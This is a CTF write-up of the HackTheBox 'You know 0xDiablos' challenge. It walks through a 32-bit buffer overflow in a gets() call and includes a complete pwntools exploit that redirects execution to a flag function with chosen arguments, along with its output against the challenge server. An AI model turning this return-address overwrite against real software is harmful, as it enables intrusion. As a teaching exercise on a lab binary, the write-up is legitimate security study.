---
title: "HackTheBox: You know 0xDiablos"
date: 2023-03-13 10:00:00 +/-0500
categories: [Cybersecurity, CTFs, HackTheBox]
tags: [CTF, cybersecurity, buffer overflow, Python, X86, flow control]
---

## Description

This is one of the challenges of the beginner track in HackTheBox.

I was given a binary with no source code. This indicated that I would need to
use Ghidra to look at the decompiled source code. First, some checks on the
binary:

```
─$ file ./vuln
./vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
```

No defensive mechanisms are turned on for this challenge.

The main function:

```c
undefined4 main(void)

{
  __gid_t __rgid;

  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

As we can see, it calls `vuln()`:

```c
void vuln(void)

{
  char local_bc [180];

  gets(local_bc);
  puts(local_bc);
  return;
}
```

Very simple buffer overflow. Another interesting function was this `flag()`:

```c
void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;

  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == L'\xdeadbeef') && (param_2 == L'\xc0ded00d')) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

So, as we redirect the control flow of the program to this function by
overwriting the return address of `vunl()`, it looks like we will need to
provide two arguments to print the flag.

In order to do that, we need to know this - X86 stores function arguments onto
the stack whereas X86-64 stores them into registers. After watching this [video](https://www.youtube.com/watch?v=eJ0FmCfD-1g)
, after overwriting the return address, we need to pad 4 bytes to account for
the new stack frame's return address. Then we need to provide two argumetns
following the padding bytes. My exploit is as below:

```python
from pwn import *

#p = process("./vuln")
p = remote('64.227.42.255', 31142)

winaddr = 0x080491e2

payload = b"A" * 188
payload += p32(winaddr)
payload += b"A" * 4 # ret address for the winaddr
payload += p32(0xdeadbeef)
payload += p32(0xc0ded00d)

p.sendline(payload)

p.interactive()

```

Since there is no PIE, we can easily get the address of `flag()`. Then 188 bytes
plus the address to the flag function plus the padding of 4 bytes plus the two
arguments for the flag function. Once you run the script:

```
└─$ python3 sol.py
[+] Opening connection to 64.227.42.255 on port 31142: Done
[*] Switching to interactive mode
You know who are 0xDiablos:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xde\xc0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x9AAAAﾭ\xde
HTB{******************}$
```

This was an easy and a very basic buffer overflow challenge in X86 environment.
